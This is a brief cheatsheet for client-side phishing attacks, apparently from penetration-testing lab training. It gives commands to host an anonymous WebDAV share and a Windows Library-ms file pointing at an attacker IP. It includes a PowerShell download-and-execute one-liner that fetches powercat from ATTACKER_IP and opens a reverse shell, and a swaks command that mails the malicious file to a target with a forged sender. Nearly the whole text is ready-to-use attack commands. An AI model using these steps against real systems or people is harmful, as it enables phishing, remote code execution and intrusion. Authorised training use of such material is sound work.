# Client-Side Attacks Cheatsheet

### Phishing Attack

**Open a WebDav**
```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
```

**Create a config.Library-ms file**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.XXX</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
**Create a link**

```bash
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP:8000/powercat.ps1'); powercat -c ATTACKER_IP -p ATTACKER_PORT -e powershell"
```

**Swaks to automatically send smtp mail**

Needs an autheticated user

```bash
sudo swaks -t daniela@beyond.com --from john@beyond.com --attach @config.Library-ms --server SMTP_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```
